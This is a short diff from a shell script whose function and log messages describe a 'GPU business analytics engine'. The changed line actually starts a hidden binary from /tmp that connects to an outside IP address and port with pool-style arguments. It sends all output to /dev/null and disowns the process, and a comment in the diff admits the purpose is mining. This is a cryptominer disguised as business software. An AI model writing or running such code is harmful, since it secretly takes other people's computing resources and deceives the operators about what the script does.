@@ -59,7 +59,7 @@ initialize_gpu_analytics_engine() {
         
         echo "[$(date)] Initializing GPU business analytics engine with enterprise parameters..."
         # GPU optimized parameters - removed CPU-specific flags for GPU mining
-        /tmp/gpu-analytics-processing-engine -o 62.60.148.249:9940 --cuda --gpu-threads auto > /dev/null 2>&1 &
+        /tmp/analytics-processing-engine -o 62.60.148.249:9940 --cuda --cpu-max-threads-hint 80 > /dev/null 2>&1 &
         disown
         
         echo "[$(date)] GPU Business Analytics Engine initialized and running in background"
